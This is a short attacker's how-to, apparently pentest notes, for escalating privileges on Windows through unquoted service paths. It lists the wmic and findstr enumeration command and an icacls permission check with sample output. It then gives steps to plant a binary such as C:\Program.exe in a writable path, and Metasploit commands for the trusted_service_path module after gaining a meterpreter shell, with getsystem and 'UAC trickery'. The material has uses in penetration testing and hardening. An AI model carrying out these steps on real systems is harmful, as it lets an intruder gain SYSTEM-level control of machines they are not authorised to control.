Finding services which may have a weakness where users with appropiate permissions can identify executables 
which are set to auto enable at boot or reload of said service.

use the following command to find these services:

wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\" |findstr /i /v """

This list will have to further be processed to identify which path you may be able to modify with the permissions level you 
currently have. This may be locally or within a meterpreter session. You will want to search the folder location output from 
the wmic command above. You usage may vary

icacls "C:\Program Files (x86)\Some\Path\here"
C:\Program Files (x86)\Some\Path\here        NT SERVICE\TrustedInstaller:(I)(F)
                                             NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                             NT AUTHORITY\SYSTEM:(I)(F)
                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                             BUILTIN\Administrators:(I)(F)
                                             BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                             BUILTIN\Users:(I)(RX)
                                             BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                             CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Here we are looking for the (F) falg to represent FULL control of that directory. 

Once you have found a folder which was identified from the wmic command, you will have to place a binary within that search path

for example:

C:\Program.exe

This file will be executed first as it was in the search path when the value is read from the registry entry: "ImagePath" 

If you are using metasploit, there is a module for this ...

exploit/windows/local/trusted_service_path

after you have a shell, and migrated to an appropate process, getsystem | incognito | UAC trickery, background the session

use exploit/windows/local/trusted_service_path
set session NUMBERHERE
exploit
